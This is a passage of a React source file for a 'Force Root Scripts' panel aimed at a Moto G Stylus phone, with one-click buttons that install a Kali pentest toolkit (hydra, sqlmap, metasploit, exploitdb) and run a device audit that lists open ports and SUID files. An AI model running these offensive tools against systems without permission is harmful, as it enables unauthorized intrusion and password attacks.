  { name: 'Full Pentest Setup', desc: 'Everything: proot Kali + all network tools + wordlists + exploit tools', command: 'pkg install -y proot-distro nmap netcat-openbsd hydra sqlmap nikto bind-tools openssh whois curl wget git python3 python3-pip && proot-distro install kali-rolling && echo "=== Installing Kali tools ===" && proot-distro login kali-rolling --shared-tmp -- bash -c "apt update -qq && apt install -y -qq nmap sqlmap hydra nikto gobuster nuclei seclists wordlists curl wget git metasploit-framework python3 python3-pip exploitdb > /dev/null 2>&1 && echo FULL PENTEST ENVIRONMENT READY" || echo "Setup may need manual intervention"', risk: 'MEDIUM' },
  { name: 'Complete Device Lockdown', desc: 'Security audit + firewall + monitoring on Moto G Stylus', command: 'echo "=== DEVICE SECURITY AUDIT ===" && echo "=== BOOTLOADER ===" && getprop ro.boot.flash.locked && getprop ro.boot.verifiedbootstate && echo "=== SELINUX ===" && getenforce 2>/dev/null && echo "=== ANDROID PATCH ===" && getprop ro.build.version.security_patch && echo "=== RUNNING SERVICES ===" && ps aux 2>/dev/null | wc -l && echo "=== OPEN PORTS ===" && ss -tlnp 2>/dev/null && echo "=== NETWORK ===" && ip -br addr 2>/dev/null && echo "=== SUID FILES ===" && find / -perm -4000 -type f 2>/dev/null | head -20 && echo "=== AUDIT COMPLETE ==="', risk: 'INFO' },
];

export const ForceRootScripts: React.FC<ForceRootScriptsProps> = ({ onExecute, onRunInTerminal }) => {
  const [activeTab, setActiveTab] = useState<Tab>('scripts');
  const [expandedCat, setExpandedCat] = useState<string | null>('Moto G Stylus');
  const [allExpanded, setAllExpanded] = useState(false);
  const [copied, setCopied] = useState('');
  const [running, setRunning] = useState<string | null>(null);
  const [output, setOutput] = useState<Record<string, string>>({});

  const copyCmd = (cmd: string, id: string) => {
    try {
      navigator.clipboard.writeText(cmd).catch(() => {
        const ta = document.createElement('textarea');
        ta.value = cmd; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); document.body.removeChild(ta);
      });
    } catch {}
    setCopied(id);
    setTimeout(() => setCopied(''), 2000);
  };

  const runScript = useCallback(async (script: RootScript) => {
    setRunning(script.name);
    try {
      const result = await onExecute(script.command);
      setOutput(prev => ({ ...prev, [script.name]: result || '[No output]' }));
    } catch (err: any) {
      setOutput(prev => ({ ...prev, [script.name]: `Error: ${err.message || 'Execution failed'}` }));
    } finally {
      setRunning(null);
    }
  }, [onExecute]);

  const TABS: { key: Tab; label: string; icon: React.ReactNode }[] = [
    { key: 'scripts', label: 'Scripts', icon: <Terminal size={12} /> },
    { key: 'one-click', label: 'One-Click', icon: <Play size={12} /> },
    { key: 'info', label: 'Info', icon: <Info size={12} /> },
  ];

  return (
    <div className="flex flex-col h-full bg-[#0D0D0D] overflow-hidden">
      {/* Header */}
      <div className="px-4 py-3 border-b border-zinc-900 shrink-0">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-2.5">
            <div className="w-8 h-8 bg-accent/20 border border-accent/30 flex items-center justify-center">
              <Shield size={16} className="text-accent" />
            </div>
            <div>
              <h2 className="text-xs font-black text-white uppercase tracking-tighter">Force Root Scripts</h2>
              <p className="text-[8px] text-zinc-500 font-black uppercase tracking-[0.15em]">Moto G Stylus 5G 2024</p>
            </div>
          </div>
          <span className="text-[7px] font-black px-1.5 py-0.5 bg-accent text-black uppercase rounded-sm">EXCLUSIVE</span>
        </div>
      </div>

      {/* Tabs */}
      <div className="flex border-b border-zinc-900 shrink-0 overflow-x-auto">
        {TABS.map(tab => (
          <button
            key={tab.key}
            onClick={() => setActiveTab(tab.key)}
            className={cn(
              "flex-shrink-0 px-4 py-2.5 flex items-center gap-1.5 text-[9px] font-black uppercase tracking-widest transition-all border-b-2",
              activeTab === tab.key
                ? "text-accent border-accent"
                : "text-zinc-500 border-transparent hover:text-zinc-300"
            )}
          >
            {tab.icon} {tab.label}
          </button>
        ))}
      </div>

      <div className="flex-1 overflow-y-auto custom-scrollbar p-3 space-y-3 pb-6">

        {/* SCRIPTS TAB */}
        {activeTab === 'scripts' && (
          <div className="space-y-3">
            <div className="flex items-center justify-between px-1">
              <span className="text-[9px] font-black text-zinc-500 uppercase tracking-widest">{FORCE_ROOT_SCRIPTS.length} Scripts</span>
              <button
                onClick={() => setAllExpanded(!allExpanded)}
                className="text-[8px] text-zinc-600 hover:text-white transition-colors flex items-center gap-1"
              >
                {allExpanded ? <ChevronUp size={10} /> : <ChevronDown size={10} />}
                {allExpanded ? 'Collapse' : 'Expand'}
              </button>
            </div>

            {CATEGORIES.map(cat => {
              const catScripts = FORCE_ROOT_SCRIPTS.filter(s => s.category === cat);
              const isExpanded = allExpanded || expandedCat === cat;
              return (
                <div key={cat} className="bg-black border border-zinc-900 overflow-hidden">
                  <button
                    onClick={() => setExpandedCat(isExpanded && !allExpanded ? null : cat)}
                    className="w-full flex items-center justify-between p-3 hover:bg-zinc-900/50 transition-colors"
                  >
                    <div className="flex items-center gap-2.5">
                      <div className={cn("w-6 h-6 flex items-center justify-center rounded-sm bg-gradient-to-br text-white", CATEGORY_COLORS[cat] || 'from-zinc-500 to-zinc-700')}>
                        {CATEGORY_ICONS[cat] || <Terminal size={12} />}
                      </div>
                      <div className="text-left">
                        <p className="text-[10px] font-black text-white uppercase">{cat}</p>
                        <p className="text-[7px] text-zinc-600">{catScripts.length} scripts</p>
                      </div>
                    </div>
                    {isExpanded ? <ChevronUp size={12} className="text-zinc-600" /> : <ChevronDown size={12} className="text-zinc-600" />}
                  </button>

                  <AnimatePresence>
                    {isExpanded && (
                      <motion.div
                        initial={{ height: 0, opacity: 0 }}
                        animate={{ height: 'auto', opacity: 1 }}
                        exit={{ height: 0, opacity: 0 }}
                        className="overflow-hidden"
                      >
                        <div className="border-t border-zinc-900">
                          {catScripts.map(script => (
                            <div key={script.name} className="px-3 py-2.5 border-b border-zinc-900/50 last:border-0">
                              <div className="flex items-start justify-between gap-2">
                                <div className="flex-1 min-w-0">
                                  <div className="flex items-center gap-2">
                                    <p className="text-[9px] font-bold text-white font-mono truncate">{script.name}</p>
                                    <span className={cn("text-[6px] font-black px-1 py-0.5 rounded-sm uppercase shrink-0 border", RISK_COLORS[script.risk])}>
                                      {script.risk}
                                    </span>
                                  </div>
                                  <p className="text-[7px] text-zinc-600 mt-0.5">{script.desc}</p>
                                  {script.notes && (
                                    <p className="text-[7px] text-amber-400/70 mt-0.5 flex items-center gap-1">
                                      <AlertTriangle size={7} /> {script.notes}
                                    </p>
                                  )}
                                </div>
                                <div className="flex items-center gap-1 shrink-0">
                                  <button
                                    onClick={() => copyCmd(script.command, script.name)}
                                    className="p-1.5 hover:bg-zinc-800 text-zinc-600 hover:text-white transition-colors"
                                    title="Copy command"
                                  >
                                    {copied === script.name ? <Check size={10} className="text-neon-green" /> : <Copy size={10} />}
                                  </button>
                                  <button
                                    onClick={() => runScript(script)}
                                    disabled={running === script.name}
                                    className="p-1.5 bg-accent/10 text-accent hover:bg-accent/20 transition-colors disabled:opacity-30"
                                    title="Run in terminal"
                                  >
                                    {running === script.name ? <RotateCw size={10} className="animate-spin" /> : <Play size={10} />}
                                  </button>
                                  <button
                                    onClick={() => onRunInTerminal(script.command)}
                                    className="p-1.5 hover:bg-zinc-800 text-zinc-600 hover:text-white transition-colors"
                                    title="Send to PTY terminal"
                                  >
                                    <Terminal size={10} />
                                  </button>
                                </div>
                              </div>

                              <pre className="mt-1.5 text-[7px] text-zinc-500 font-mono bg-zinc-900/30 px-2 py-1 rounded-sm truncate">{script.command}</pre>

                              {output[script.name] && (
                                <pre className="mt-1.5 text-[7px] text-neon-green font-mono bg-black border border-zinc-800 px-2 py-1.5 rounded-sm max-h-24 overflow-y-auto custom-scrollbar whitespace-pre-wrap">{output[script.name]}</pre>
                              )}
                            </div>
                          ))}
                        </div>
                      </motion.div>
                    )}
                  </AnimatePresence>
                </div>
              );
            })}
          </div>
        )}

        {/* ONE-CLICK TAB */}
        {activeTab === 'one-click' && (
          <div className="space-y-2">
            <p className="text-[9px] font-black text-zinc-500 uppercase tracking-widest px-1">Automated Setup Scripts</p>

            {ONE_CLICKS.map((oc) => (
              <div key={oc.name} className="bg-black border border-zinc-900 p-3 space-y-2">
                <div className="flex items-start justify-between gap-2">
                  <div className="min-w-0">
                    <div className="flex items-center gap-2">
                      <p className="text-[10px] font-black text-white uppercase">{oc.name}</p>
                      <span className={cn("text-[6px] font-black px-1 py-0.5 rounded-sm uppercase border", RISK_COLORS[oc.risk])}>
                        {oc.risk}
                      </span>
                    </div>
                    <p className="text-[8px] text-zinc-500 mt-0.5">{oc.desc}</p>
                  </div>
                  <div className="flex items-center gap-1 shrink-0">
                    <button
                      onClick={() => copyCmd(oc.command, oc.name)}
                      className="p-1.5 hover:bg-zinc-800 text-zinc-600 hover:text-white transition-colors"
                    >
                      {copied === oc.name ? <Check size={10} className="text-neon-green" /> : <Copy size={10} />}
                    </button>
                    <button
                      onClick={() => runScript({ name: oc.name, desc: oc.desc, command: oc.command, category: '', risk: oc.risk })}
                      disabled={running === oc.name}
                      className="px-2.5 py-1.5 bg-accent text-black text-[8px] font-black uppercase tracking-widest hover:bg-white transition-colors flex items-center gap-1 disabled:opacity-30"
                    >
                      {running === oc.name ? <RotateCw size={8} className="animate-spin" /> : <Play size={8} />}
                      Run
                    </button>
                  </div>
                </div>

                {output[oc.name] && (
                  <pre className="text-[7px] text-neon-green font-mono bg-zinc-900/30 border border-zinc-800 px-2 py-1.5 rounded-sm max-h-32 overflow-y-auto custom-scrollbar whitespace-pre-wrap">{output[oc.name]}</pre>
                )}
              </div>
            ))}
          </div>
        )}

        {/* INFO TAB */}
        {activeTab === 'info' && (
          <div className="space-y-3">
            {/* Device Card */}
            <div className="bg-black border border-accent/20 p-4 space-y-3">
              <div className="flex items-center gap-2">
                <Smartphone size={14} className="text-accent" />
                <p className="text-[10px] font-black text-white uppercase">Target Device</p>
              </div>
              <div className="space-y-1.5">
                {[
                  { label: 'Device', value: 'Moto G Stylus 5G (2024)' },
                  { label: 'SoC', value: 'Qualcomm Snapdragon 6 Gen 1 (SM4450)' },
                  { label: 'CPU', value: 'Octa-core Kryo (1x2.2 + 3x1.8 + 4x1.8 GHz)' },
                  { label: 'GPU', value: 'Adreno 710' },
                  { label: 'RAM', value: '8 GB LPDDR4X' },
                  { label: 'Storage', value: '128/256 GB UFS 2.2' },
                  { label: 'Display', value: '6.7" FHD+ 120Hz IPS LCD' },
                  { label: 'Stylus', value: 'Built-in Motorola Stylus w/ SDK' },
                  { label: 'Android', value: '14 (upgradable to 15)' },
                  { label: 'Codename', value: 'penang' },
                  { label: 'Bootloader', value: 'Unlockable (Motorola)' },
                  { label: 'Root', value: 'NOT rooted (Termux + proot/ADB)' },
                ].map(item => (
                  <div key={item.label} className="flex items-center justify-between">
                    <span className="text-[8px] text-zinc-500 uppercase tracking-widest">{item.label}</span>
                    <span className="text-[9px] text-white font-mono">{item.value}</span>
                  </div>
                ))}
              </div>
            </div>

            {/* What is Force Root */}
            <div className="bg-black border border-zinc-900 p-4 space-y-2">
              <p className="text-[10px] font-black text-white uppercase flex items-center gap-2">
                <Shield size={12} className="text-accent" /> What is Force Root?
              </p>
              <p className="text-[8px] text-zinc-400 leading-relaxed">
                Force Root scripts use Termux, proot-distro, ADB, and Termux:API to achieve root-level capabilities on non-rooted devices.
                These techniques leverage Android developer tools and Termux Linux environment to bypass normal app sandbox restrictions.
              </p>
              <div className="space-y-1.5 mt-2">
                {[
                  { title: 'Proot-Distro', desc: 'Full Linux distro (Ubuntu/Kali) with fake root — install any package' },
                  { title: 'ADB Wireless', desc: 'System-level access via Android Debug Bridge over WiFi' },
                  { title: 'Termux:API', desc: 'Access battery, sensors, camera, GPS, notifications, clipboard, SMS' },
                  { title: 'Storage Mounts', desc: 'Access SD card, shared storage, and bind-mount paths' },
                  { title: 'Network Tools', desc: 'Raw socket access via proot for real nmap scans' },
                  { title: 'Magisk Root', desc: 'Boot image patching and bootloader unlock prep for true root' },
                ].map(item => (
                  <div key={item.title} className="border border-zinc-800 p-2">
                    <p className="text-[8px] font-black text-accent uppercase">{item.title}</p>
                    <p className="text-[7px] text-zinc-500 mt-0.5">{item.desc}</p>
                  </div>
                ))}
              </div>
            </div>

            {/* Prerequisites */}
            <div className="bg-black border border-zinc-900 p-4 space-y-2">
              <p className="text-[10px] font-black text-white uppercase">Prerequisites</p>
              <div className="space-y-1.5">
                {[
                  'Termux from F-Droid (NOT Play Store)',
                  'Developer Options enabled on phone',
                  'Wireless Debugging enabled (for ADB)',
                  'Termux:API app installed from F-Droid',
                  'At least 2GB free storage (for proot distros)',
                ].map((item, i) => (
                  <div key={i} className="flex items-start gap-2">
                    <div className="w-1 h-1 rounded-full bg-accent mt-1.5 shrink-0" />
                    <p className="text-[8px] text-zinc-400">{item}</p>
                  </div>
                ))}
              </div>
            </div>

            {/* Warning */}
            <div className="bg-red-500/5 border border-red-500/20 p-4 space-y-2">
              <div className="flex items-center gap-2">
                <AlertTriangle size={12} className="text-red-400" />
                <p className="text-[10px] font-black text-red-400 uppercase">Legal Disclaimer</p>
              </div>
              <p className="text-[8px] text-zinc-500 leading-relaxed">
                These scripts are for authorized security testing and personal device administration only.
                Unauthorized access to computer systems is illegal. Only use these tools on devices you own or have explicit permission to test.
                Nex.AI and its developers assume no liability for misuse.
              </p>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};
